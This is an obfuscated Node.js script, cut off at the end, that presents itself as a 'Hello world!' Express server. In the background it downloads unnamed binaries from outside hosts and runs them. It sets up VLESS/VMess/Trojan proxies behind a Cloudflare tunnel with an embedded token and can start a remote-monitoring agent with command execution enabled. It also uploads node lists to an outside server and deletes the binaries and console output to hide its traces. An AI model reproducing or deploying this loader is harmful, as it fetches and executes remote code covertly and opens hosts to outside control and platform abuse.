const _0x573ec6=_0x3f5d;(function(_0x3baf86,_0x2ce1de){const _0x25d3f7=_0x3f5d,_0x5ddf48=_0x3baf86();while(!![]){try{const _0x3b3318=-parseInt(_0x25d3f7(0x22a))/0x1+-parseInt(_0x25d3f7(0x23e))/0x2+-parseInt(_0x25d3f7(0x234))/0x3*(-parseInt(_0x25d3f7(0x233))/0x4)+-parseInt(_0x25d3f7(0x201))/0x5*(-parseInt(_0x25d3f7(0x1a5))/0x6)+-parseInt(_0x25d3f7(0x227))/0x7*(-parseInt(_0x25d3f7(0x235))/0x8)+parseInt(_0x25d3f7(0x204))/0x9+parseInt(_0x25d3f7(0x1d6))/0xa*(parseInt(_0x25d3f7(0x247))/0xb);if(_0x3b3318===_0x2ce1de)break;else _0x5ddf48['push'](_0x5ddf48['shift']());}catch(_0x5b5bc9){_0x5ddf48['push'](_0x5ddf48['shift']());}}}(_0x1ecd,0x95413));const express=require(_0x573ec6(0x242)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x573ec6(0x1e5)),{promisify}=require(_0x573ec6(0x1f0)),exec=promisify(require(_0x573ec6(0x229))[_0x573ec6(0x1bd)]),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x573ec6(0x18b)]||'',PROJECT_URL=process[_0x573ec6(0x1ec)][_0x573ec6(0x1ea)]||'',AUTO_ACCESS=process['env'][_0x573ec6(0x20a)]||![],FILE_PATH=process[_0x573ec6(0x1ec)][_0x573ec6(0x1b8)]||'./tmp',SUB_PATH=process[_0x573ec6(0x1ec)][_0x573ec6(0x1d5)]||'sub',PORT=process[_0x573ec6(0x1ec)][_0x573ec6(0x220)]||process[_0x573ec6(0x1ec)]['PORT']||0xbb8,UUID=process[_0x573ec6(0x1ec)]['UUID']||_0x573ec6(0x1f5),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x573ec6(0x1ec)][_0x573ec6(0x1b2)]||'',NEZHA_KEY=process[_0x573ec6(0x1ec)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x573ec6(0x1ec)]['ARGO_DOMAIN']||_0x573ec6(0x1f3),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x573ec6(0x1f9),ARGO_PORT=process[_0x573ec6(0x1ec)][_0x573ec6(0x24a)]||0x1f41,CFIP=process['env'][_0x573ec6(0x1c2)]||_0x573ec6(0x1fe),CFPORT=process[_0x573ec6(0x1ec)][_0x573ec6(0x1bc)]||0x1bb,NAME=process[_0x573ec6(0x1ec)]['NAME']||_0x573ec6(0x213);!fs[_0x573ec6(0x21a)](FILE_PATH)?(fs[_0x573ec6(0x1d9)](FILE_PATH),console[_0x573ec6(0x1cd)](FILE_PATH+_0x573ec6(0x1e1))):console[_0x573ec6(0x1cd)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x25c2d2=_0x573ec6,_0x41d480=_0x25c2d2(0x228);let _0x302ded='';for(let _0x53805f=0x0;_0x53805f<0x6;_0x53805f++){_0x302ded+=_0x41d480[_0x25c2d2(0x1f8)](Math[_0x25c2d2(0x219)](Math['random']()*_0x41d480['length']));}return _0x302ded;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x573ec6(0x240)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x573ec6(0x240)](FILE_PATH,_0x573ec6(0x224)),listPath=path[_0x573ec6(0x240)](FILE_PATH,_0x573ec6(0x1e2)),bootLogPath=path[_0x573ec6(0x240)](FILE_PATH,_0x573ec6(0x18e)),configPath=path[_0x573ec6(0x240)](FILE_PATH,_0x573ec6(0x19c));function deleteNodes(){const _0x4d8c45=_0x573ec6;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x3962ec;try{_0x3962ec=fs[_0x4d8c45(0x1ca)](subPath,_0x4d8c45(0x1c3));}catch{return null;}const _0x119f68=Buffer[_0x4d8c45(0x232)](_0x3962ec,'base64')[_0x4d8c45(0x1b3)](_0x4d8c45(0x1c3)),_0x28704e=_0x119f68['split']('\x0a')[_0x4d8c45(0x208)](_0x3a6ca5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d8c45(0x21d)](_0x3a6ca5));if(_0x28704e['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x4d8c45(0x1da),JSON['stringify']({'nodes':_0x28704e}),{'headers':{'Content-Type':_0x4d8c45(0x20f)}})[_0x4d8c45(0x1f6)](_0xc53024=>{return null;}),null;}catch(_0x3cca5b){return null;}}function cleanupOldFiles(){const _0x2063f4=_0x573ec6;try{const _0x13f413=fs[_0x2063f4(0x19d)](FILE_PATH);_0x13f413['forEach'](_0x5ed842=>{const _0x5fb6d8=_0x2063f4,_0x14aba7=path[_0x5fb6d8(0x240)](FILE_PATH,_0x5ed842);try{const _0x29598d=fs[_0x5fb6d8(0x189)](_0x14aba7);_0x29598d[_0x5fb6d8(0x191)]()&&fs[_0x5fb6d8(0x236)](_0x14aba7);}catch(_0x4d5013){}});}catch(_0x1d20b6){}}app[_0x573ec6(0x249)]('/',function(_0x171c7b,_0x5f28ae){const _0x49ab26=_0x573ec6;_0x5f28ae[_0x49ab26(0x1aa)](_0x49ab26(0x1d2));});async function generateConfig(){const _0x414892=_0x573ec6,_0x37bab2={'log':{'access':_0x414892(0x23a),'error':_0x414892(0x23a),'loglevel':_0x414892(0x1b0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x414892(0x1cc),'settings':{'clients':[{'id':UUID,'flow':_0x414892(0x244)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x414892(0x210),'dest':0xbba},{'path':_0x414892(0x202),'dest':0xbbb},{'path':_0x414892(0x1f4),'dest':0xbbc}]},'streamSettings':{'network':_0x414892(0x1a9)}},{'port':0xbb9,'listen':_0x414892(0x222),'protocol':_0x414892(0x1cc),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x414892(0x1b0)}},{'port':0xbba,'listen':_0x414892(0x222),'protocol':_0x414892(0x1cc),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x414892(0x1b0),'wsSettings':{'path':_0x414892(0x210)}},'sniffing':{'enabled':!![],'destOverride':[_0x414892(0x1be),_0x414892(0x245),_0x414892(0x196)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x414892(0x222),'protocol':_0x414892(0x22d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x414892(0x202)}},'sniffing':{'enabled':!![],'destOverride':[_0x414892(0x1be),'tls',_0x414892(0x196)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x414892(0x222),'protocol':_0x414892(0x20d),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x414892(0x1f4)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x414892(0x245),_0x414892(0x196)],'metadataOnly':![]}}],'dns':{'servers':[_0x414892(0x190)]},'outbounds':[{'protocol':_0x414892(0x1a7),'tag':'direct'},{'protocol':'blackhole','tag':_0x414892(0x203)}]};fs[_0x414892(0x205)](path[_0x414892(0x240)](FILE_PATH,_0x414892(0x19c)),JSON[_0x414892(0x1dc)](_0x37bab2,null,0x2));}function getSystemArchitecture(){const _0x3ad77a=_0x573ec6,_0x5940ba=os['arch']();return _0x5940ba===_0x3ad77a(0x1c8)||_0x5940ba===_0x3ad77a(0x19a)||_0x5940ba===_0x3ad77a(0x18f)?_0x3ad77a(0x1c8):_0x3ad77a(0x1fa);}function downloadFile(_0x28507f,_0x4a3a26,_0x55a2ff){const _0x21acaa=_0x573ec6,_0x494751=_0x28507f;!fs[_0x21acaa(0x21a)](FILE_PATH)&&fs[_0x21acaa(0x1d9)](FILE_PATH,{'recursive':!![]});const _0x55a9ad=fs['createWriteStream'](_0x494751);axios({'method':_0x21acaa(0x249),'url':_0x4a3a26,'responseType':_0x21acaa(0x246)})[_0x21acaa(0x226)](_0x2b269b=>{const _0x305994=_0x21acaa;_0x2b269b[_0x305994(0x1ee)][_0x305994(0x23d)](_0x55a9ad),_0x55a9ad['on'](_0x305994(0x19b),()=>{const _0xde5f1c=_0x305994;_0x55a9ad[_0xde5f1c(0x23f)](),console[_0xde5f1c(0x1cd)]('Download\x20'+path[_0xde5f1c(0x231)](_0x494751)+_0xde5f1c(0x1b9)),_0x55a2ff(null,_0x494751);}),_0x55a9ad['on']('error',_0x18b6bb=>{const _0x3fc350=_0x305994;fs[_0x3fc350(0x241)](_0x494751,()=>{});const _0x32943d=_0x3fc350(0x18d)+path[_0x3fc350(0x231)](_0x494751)+_0x3fc350(0x1b4)+_0x18b6bb['message'];console[_0x3fc350(0x1c6)](_0x32943d),_0x55a2ff(_0x32943d);});})['catch'](_0x3c6ea9=>{const _0x277c3b=_0x21acaa,_0x656b45=_0x277c3b(0x18d)+path[_0x277c3b(0x231)](_0x494751)+_0x277c3b(0x1b4)+_0x3c6ea9['message'];console[_0x277c3b(0x1c6)](_0x656b45),_0x55a2ff(_0x656b45);});}async function downloadFilesAndRun(){const _0x39e95c=_0x573ec6,_0x26c508=getSystemArchitecture(),_0x43e855=getFilesForArchitecture(_0x26c508);if(_0x43e855[_0x39e95c(0x1ce)]===0x0){console[_0x39e95c(0x1cd)](_0x39e95c(0x1db));return;}const _0x27293f=_0x43e855[_0x39e95c(0x1e4)](_0x36409b=>{return new Promise((_0x1448da,_0x254ff4)=>{const _0x68e56d=_0x3f5d;downloadFile(_0x36409b[_0x68e56d(0x1c7)],_0x36409b[_0x68e56d(0x18c)],(_0x45e9da,_0x5ad832)=>{_0x45e9da?_0x254ff4(_0x45e9da):_0x1448da(_0x5ad832);});});});try{await Promise[_0x39e95c(0x1a4)](_0x27293f);}catch(_0x416e98){console['error'](_0x39e95c(0x21e),_0x416e98);return;}function _0x269b70(_0x1b6574){const _0x49fa3d=_0x39e95c,_0x3dbead=0x1fd;_0x1b6574[_0x49fa3d(0x1bb)](_0x4ece46=>{const _0x2e5ca9=_0x49fa3d;fs[_0x2e5ca9(0x21a)](_0x4ece46)&&fs[_0x2e5ca9(0x217)](_0x4ece46,_0x3dbead,_0x2ab3d4=>{const _0x1dbe6b=_0x2e5ca9;_0x2ab3d4?console[_0x1dbe6b(0x1c6)](_0x1dbe6b(0x207)+_0x4ece46+':\x20'+_0x2ab3d4):console[_0x1dbe6b(0x1cd)](_0x1dbe6b(0x1c5)+_0x4ece46+':\x20'+_0x3dbead[_0x1dbe6b(0x1b3)](0x8));});});}const _0x47dbcc=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x269b70(_0x47dbcc);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x13e902=NEZHA_SERVER[_0x39e95c(0x212)](':')?NEZHA_SERVER[_0x39e95c(0x1eb)](':')['pop']():'',_0x2d63e1=new Set([_0x39e95c(0x1c4),_0x39e95c(0x199),_0x39e95c(0x223),_0x39e95c(0x1c9),_0x39e95c(0x23c),_0x39e95c(0x195)]),_0x4ef982=_0x2d63e1[_0x39e95c(0x20b)](_0x13e902)?_0x39e95c(0x1f2):_0x39e95c(0x1b1),_0x45a0fd=_0x39e95c(0x20c)+NEZHA_KEY+_0x39e95c(0x1d4)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4ef982+_0x39e95c(0x1e0)+UUID;fs[_0x39e95c(0x205)](path[_0x39e95c(0x240)](FILE_PATH,_0x39e95c(0x1a2)),_0x45a0fd);const _0x3a28a4=_0x39e95c(0x1fb)+phpPath+_0x39e95c(0x1e9)+FILE_PATH+_0x39e95c(0x218);try{await exec(_0x3a28a4),console[_0x39e95c(0x1cd)](phpName+_0x39e95c(0x22b)),await new Promise(_0x479993=>setTimeout(_0x479993,0x3e8));}catch(_0x3d4bb0){console[_0x39e95c(0x1c6)]('php\x20running\x20error:\x20'+_0x3d4bb0);}}else{let _0x5cda74='';const _0x49200f=[_0x39e95c(0x1c4),_0x39e95c(0x199),_0x39e95c(0x223),_0x39e95c(0x1c9),'2083',_0x39e95c(0x195)];_0x49200f[_0x39e95c(0x212)](NEZHA_PORT)&&(_0x5cda74=_0x39e95c(0x1af));const _0x2a012c='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x39e95c(0x225)+NEZHA_KEY+'\x20'+_0x5cda74+_0x39e95c(0x1e6);try{await exec(_0x2a012c),console[_0x39e95c(0x1cd)](npmName+'\x20is\x20running'),await new Promise(_0x861131=>setTimeout(_0x861131,0x3e8));}catch(_0x25f675){console[_0x39e95c(0x1c6)](_0x39e95c(0x21c)+_0x25f675);}}}else console['log'](_0x39e95c(0x1d7));const _0x16575e='nohup\x20'+webPath+_0x39e95c(0x1bf)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x16575e),console['log'](webName+'\x20is\x20running'),await new Promise(_0x7a47f=>setTimeout(_0x7a47f,0x3e8));}catch(_0x32493b){console[_0x39e95c(0x1c6)](_0x39e95c(0x1f7)+_0x32493b);}if(fs[_0x39e95c(0x21a)](botPath)){let _0x377708;if(ARGO_AUTH[_0x39e95c(0x1e7)](/^[A-Z0-9a-z=]{120,250}$/))_0x377708=_0x39e95c(0x22f)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x377708=_0x39e95c(0x19f)+FILE_PATH+'/tunnel.yml\x20run':_0x377708=_0x39e95c(0x1c0)+FILE_PATH+_0x39e95c(0x1d1)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x377708+_0x39e95c(0x1df)),console[_0x39e95c(0x1cd)](botName+_0x39e95c(0x22b)),await new Promise(_0xcfb8a0=>setTimeout(_0xcfb8a0,0x7d0));}catch(_0x2ab3e1){console[_0x39e95c(0x1c6)](_0x39e95c(0x215)+_0x2ab3e1);}}await new Promise(_0x15a954=>setTimeout(_0x15a954,0x1388));}function getFilesForArchitecture(_0x4aaecc){const _0x3f241f=_0x573ec6;let _0xb5b8a;_0x4aaecc==='arm'?_0xb5b8a=[{'fileName':webPath,'fileUrl':_0x3f241f(0x24b)},{'fileName':botPath,'fileUrl':_0x3f241f(0x1d3)}]:_0xb5b8a=[{'fileName':webPath,'fileUrl':_0x3f241f(0x1a3)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3aeb60=_0x4aaecc===_0x3f241f(0x1c8)?_0x3f241f(0x23b):_0x3f241f(0x1ef);_0xb5b8a[_0x3f241f(0x197)]({'fileName':npmPath,'fileUrl':_0x3aeb60});}else{const _0x293dc6=_0x4aaecc===_0x3f241f(0x1c8)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0xb5b8a[_0x3f241f(0x197)]({'fileName':phpPath,'fileUrl':_0x293dc6});}}return _0xb5b8a;}function argoType(){const _0x560f23=_0x573ec6;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x560f23(0x212)](_0x560f23(0x22c))){fs[_0x560f23(0x205)](path[_0x560f23(0x240)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x45bc5a=_0x560f23(0x1c1)+ARGO_AUTH['split']('\x22')[0xb]+_0x560f23(0x214)+path['join'](FILE_PATH,_0x560f23(0x239))+_0x560f23(0x198)+ARGO_DOMAIN+_0x560f23(0x1e3)+ARGO_PORT+_0x560f23(0x200);fs[_0x560f23(0x205)](path[_0x560f23(0x240)](FILE_PATH,'tunnel.yml'),_0x45bc5a);}else console[_0x560f23(0x1cd)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x50bb79=_0x573ec6;let _0x363f8c;if(ARGO_AUTH&&ARGO_DOMAIN)_0x363f8c=ARGO_DOMAIN,console[_0x50bb79(0x1cd)](_0x50bb79(0x1d8),_0x363f8c),await _0x11acdb(_0x363f8c);else try{const _0x554304=fs[_0x50bb79(0x1ca)](path[_0x50bb79(0x240)](FILE_PATH,_0x50bb79(0x18e)),_0x50bb79(0x1c3)),_0x556f24=_0x554304[_0x50bb79(0x1eb)]('\x0a'),_0x5e7576=[];_0x556f24[_0x50bb79(0x1bb)](_0x5211c5=>{const _0xfe164b=_0x50bb79,_0x5cf188=_0x5211c5[_0xfe164b(0x1e7)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5cf188){const _0x3e9b68=_0x5cf188[0x1];_0x5e7576[_0xfe164b(0x1ab)](_0x3e9b68);}});if(_0x5e7576['length']>0x0)_0x363f8c=_0x5e7576[0x0],console[_0x50bb79(0x1cd)](_0x50bb79(0x1de),_0x363f8c),await _0x11acdb(_0x363f8c);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x50bb79(0x240)](FILE_PATH,_0x50bb79(0x18e)));async function _0x56419e(){const _0x5bad90=_0x50bb79;try{process[_0x5bad90(0x1a1)]==='win32'?await exec(_0x5bad90(0x1cf)+botName+_0x5bad90(0x248)):await exec(_0x5bad90(0x206)+botName[_0x5bad90(0x1f8)](0x0)+']'+botName[_0x5bad90(0x1a8)](0x1)+_0x5bad90(0x1ff));}catch(_0x47bd7a){}}_0x56419e(),await new Promise(_0x4864ef=>setTimeout(_0x4864ef,0xbb8));const _0x2ef8c6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x50bb79(0x1d1)+ARGO_PORT;try{await exec(_0x50bb79(0x1fb)+botPath+'\x20'+_0x2ef8c6+_0x50bb79(0x1df)),console['log'](botName+_0x50bb79(0x22b)),await new Promise(_0x1c7408=>setTimeout(_0x1c7408,0xbb8)),await extractDomains();}catch(_0x4482e1){console[_0x50bb79(0x1c6)](_0x50bb79(0x215)+_0x4482e1);}}}catch(_0x351c5b){console['error']('Error\x20reading\x20boot.log:',_0x351c5b);}async function _0x5f1477(){const _0x522016=_0x50bb79;try{const _0x465f0f=await axios['get'](_0x522016(0x1fc),{'timeout':0xbb8});if(_0x465f0f[_0x522016(0x1ee)]&&_0x465f0f[_0x522016(0x1ee)][_0x522016(0x211)]&&_0x465f0f[_0x522016(0x1ee)][_0x522016(0x1b7)])return _0x465f0f[_0x522016(0x1ee)][_0x522016(0x211)]+'_'+_0x465f0f['data'][_0x522016(0x1b7)];}catch(_0x4b005f){try{const _0xffeca6=await axios[_0x522016(0x249)](_0x522016(0x1ed),{'timeout':0xbb8});if(_0xffeca6[_0x522016(0x1ee)]&&_0xffeca6[_0x522016(0x1ee)][_0x522016(0x20e)]==='success'&&_0xffeca6[_0x522016(0x1ee)][_0x522016(0x1e8)]&&_0xffeca6[_0x522016(0x1ee)]['org'])return _0xffeca6[_0x522016(0x1ee)][_0x522016(0x1e8)]+'_'+_0xffeca6[_0x522016(0x1ee)]['org'];}catch(_0x1440ec){}}return'Unknown';}async function _0x11acdb(_0x2354ab){const _0x228f84=await _0x5f1477(),_0x2beb22=NAME?NAME+'-'+_0x228f84:_0x228f84;return new Promise(_0x256558=>{setTimeout(()=>{const _0x5198ed=_0x3f5d,_0x2dafa9={'v':'2','ps':''+_0x2beb22,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5198ed(0x1b0),'net':'ws','type':_0x5198ed(0x1b0),'host':_0x2354ab,'path':_0x5198ed(0x21f),'tls':_0x5198ed(0x245),'sni':_0x2354ab,'alpn':'','fp':_0x5198ed(0x1ad)},_0x193571='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2354ab+_0x5198ed(0x193)+_0x2354ab+_0x5198ed(0x1fd)+_0x2beb22+_0x5198ed(0x230)+Buffer[_0x5198ed(0x232)](JSON[_0x5198ed(0x1dc)](_0x2dafa9))['toString'](_0x5198ed(0x21b))+_0x5198ed(0x237)+UUID+'@'+CFIP+':'+CFPORT+_0x5198ed(0x1ae)+_0x2354ab+_0x5198ed(0x193)+_0x2354ab+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x2beb22+_0x5198ed(0x19e);console[_0x5198ed(0x1cd)](Buffer['from'](_0x193571)[_0x5198ed(0x1b3)](_0x5198ed(0x21b))),fs[_0x5198ed(0x205)](subPath,Buffer['from'](_0x193571)['toString'](_0x5198ed(0x21b))),console[_0x5198ed(0x1cd)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5198ed(0x249)]('/'+SUB_PATH,(_0x58d488,_0x5ad686)=>{const _0x35d334=_0x5198ed,_0x1e1a04=Buffer[_0x35d334(0x232)](_0x193571)[_0x35d334(0x1b3)](_0x35d334(0x21b));_0x5ad686[_0x35d334(0x1a6)]('Content-Type','text/plain;\x20charset=utf-8'),_0x5ad686['send'](_0x1e1a04);}),_0x256558(_0x193571);},0x7d0);});}}async function uploadNodes(){const _0x1edd0d=_0x573ec6;if(UPLOAD_URL&&PROJECT_URL){const _0x58f090=PROJECT_URL+'/'+SUB_PATH,_0x506466={'subscription':[_0x58f090]};try{const _0x6fccb3=await axios['post'](UPLOAD_URL+_0x1edd0d(0x238),_0x506466,{'headers':{'Content-Type':'application/json'}});return _0x6fccb3&&_0x6fccb3[_0x1edd0d(0x20e)]===0xc8?(console[_0x1edd0d(0x1cd)]('Subscription\x20uploaded\x20successfully'),_0x6fccb3):null;}catch(_0x3bacf6){if(_0x3bacf6[_0x1edd0d(0x1b5)]){if(_0x3bacf6[_0x1edd0d(0x1b5)][_0x1edd0d(0x20e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1edd0d(0x21a)](listPath))return;const _0x1e2e1f=fs[_0x1edd0d(0x1ca)](listPath,_0x1edd0d(0x1c3)),_0x2c698c=_0x1e2e1f[_0x1edd0d(0x1eb)]('\x0a')[_0x1edd0d(0x208)](_0x5ef9fe=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5ef9fe));if(_0x2c698c[_0x1edd0d(0x1ce)]===0x0)return;const _0x52cc4c=JSON['stringify']({'nodes':_0x2c698c});try{const _0x4bbd8e=await axios[_0x1edd0d(0x243)](UPLOAD_URL+'/api/add-nodes',_0x52cc4c,{'headers':{'Content-Type':'application/json'}});return _0x4bbd8e&&_0x4bbd8e[_0x1edd0d(0x20e)]===0xc8?(console[_0x1edd0d(0x1cd)](_0x1edd0d(0x1d0)),_0x4bbd8e):null;}catch(_0x538f98){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x11df4f=_0x3f5d,_0x4697bf=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4697bf['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4697bf[_0x11df4f(0x1ab)](phpPath);process[_0x11df4f(0x1a1)]===_0x11df4f(0x1f1)?exec(_0x11df4f(0x192)+_0x4697bf[_0x11df4f(0x240)]('\x20')+_0x11df4f(0x1ac),_0x2680d4=>{const _0x4976e6=_0x11df4f;console[_0x4976e6(0x1dd)](),console[_0x4976e6(0x1cd)](_0x4976e6(0x1b6)),console['log'](_0x4976e6(0x221));}):exec('rm\x20-rf\x20'+_0x4697bf['join']('\x20')+_0x11df4f(0x1a0),_0x26bde8=>{const _0x5be5e5=_0x11df4f;console[_0x5be5e5(0x1dd)](),console[_0x5be5e5(0x1cd)](_0x5be5e5(0x1b6)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x1ecd(){const _0x166c01=['https://amd64.ssss.nyc.mn/web','all','1101444NDJXal','set','freedom','substring','tcp','send','push','\x20>\x20nul\x202>&1','firefox','?security=tls&sni=','--tls','none','false','NEZHA_PORT','toString','\x20failed:\x20','response','App\x20is\x20running','org','FILE_PATH','\x20successfully','automatic\x20access\x20task\x20added\x20successfully','forEach','CFPORT','exec','http','\x20-c\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20tunnel:\x20','CFIP','utf-8','443','Empowerment\x20success\x20for\x20','error','fileName','arm','2087','readFileSync','Add\x20automatic\x20access\x20task\x20faild:\x20','vless','log','length','taskkill\x20/f\x20/im\x20','Nodes\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Hello\x20world!','https://arm64.ssss.nyc.mn/bot','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','SUB_PATH','1859820mRnFVo','NEZHA\x20variable\x20is\x20empty,skip\x20running','ARGO_DOMAIN:','mkdirSync','/api/delete-nodes','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','stringify','clear','ArgoDomain:','\x20>/dev/null\x202>&1\x20&','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20is\x20created','list.txt','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','map','path','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','match','countryCode','\x20-c\x20\x22','PROJECT_URL','split','env','http://ip-api.com/json/','data','https://amd64.ssss.nyc.mn/agent','util','win32','true','2dogs.fackyfwt.nyc.mn','/trojan-argo','8320f8b5-4eb5-4170-b0f0-9b4a31c6d4fa','catch','web\x20running\x20error:\x20','charAt','eyJhIjoiYTViMjIyNmU0ZmM2MTEwZTczZTVjMjhjMzA1M2ZlMDIiLCJ0IjoiZDRkMWU3YTctY2E2Yy00NDY2LTliOWItODcxY2EwMjM2ZGRmIiwicyI6Ik1XRTBOMk16WlRVdE4ySm1OQzAwWTJJMkxXRXpZbU10TlRNd1l6RmlPVGxrT0RZMiJ9','amd','nohup\x20','https://ipapi.co/json/','&path=%2Fvless-argo%3Fed%3D2560#','cdns.doon.eu.org','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','5nBafBV','/vmess-argo','block','3831210erlHHO','writeFileSync','pkill\x20-f\x20\x22[','Empowerment\x20failed\x20for\x20','filter','message','AUTO_ACCESS','has','\x0aclient_secret:\x20','trojan','status','application/json','/vless-argo','country_code','includes','2dogs','\x0a\x20\x20credentials-file:\x20','Error\x20executing\x20command:\x20','listen','chmod','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','floor','existsSync','base64','npm\x20running\x20error:\x20','test','Error\x20downloading\x20files:','/vmess-argo?ed=2560','SERVER_PORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','127.0.0.1','2096','sub.txt','\x20-p\x20','then','7JAIvfu','abcdefghijklmnopqrstuvwxyz','child_process','692797HhdMhy','\x20is\x20running','TunnelSecret','vmess','https://oooo.serv00.net/add-url','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0a\x0avmess://','basename','from','3167124MHInZp','3SLXxHk','5292656emopUD','unlinkSync','\x0a\x0atrojan://','/api/add-subscriptions','tunnel.json','/dev/null','https://arm64.ssss.nyc.mn/agent','2083','pipe','2260894NdsaRZ','close','join','unlink','express','post','xtls-rprx-vision','tls','stream','22urQATr','.exe\x20>\x20nul\x202>&1','get','ARGO_PORT','https://arm64.ssss.nyc.mn/web','statSync','Skipping\x20adding\x20automatic\x20access\x20task','UPLOAD_URL','fileUrl','Download\x20','boot.log','aarch64','https+local://8.8.8.8/dns-query','isFile','del\x20/f\x20/q\x20','&fp=firefox&type=ws&host=','Unhandled\x20error\x20in\x20startserver:','2053','quic','unshift','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','8443','arm64','finish','config.json','readdirSync','\x0a\x20\x20\x20\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20>/dev/null\x202>&1','platform','config.yaml'];_0x1ecd=function(){return _0x166c01;};return _0x1ecd();}function _0x3f5d(_0xa2c60b,_0x2a404c){_0xa2c60b=_0xa2c60b-0x189;const _0x1ecd76=_0x1ecd();let _0x3f5d96=_0x1ecd76[_0xa2c60b];return _0x3f5d96;}cleanFiles();async function AddVisitTask(){const _0x27f135=_0x573ec6;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x27f135(0x18a));return;}try{const _0x11cb3a=await axios['post'](_0x27f135(0x22e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x27f135(0x20f)}});return console[_0x27f135(0x1cd)](_0x27f135(0x1ba)),_0x11cb3a;}catch(_0x12f61e){return console[_0x27f135(0x1c6)](_0x27f135(0x1cb)+_0x12f61e[_0x27f135(0x209)]),null;}}async function startserver(){const _0xe3c878=_0x573ec6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 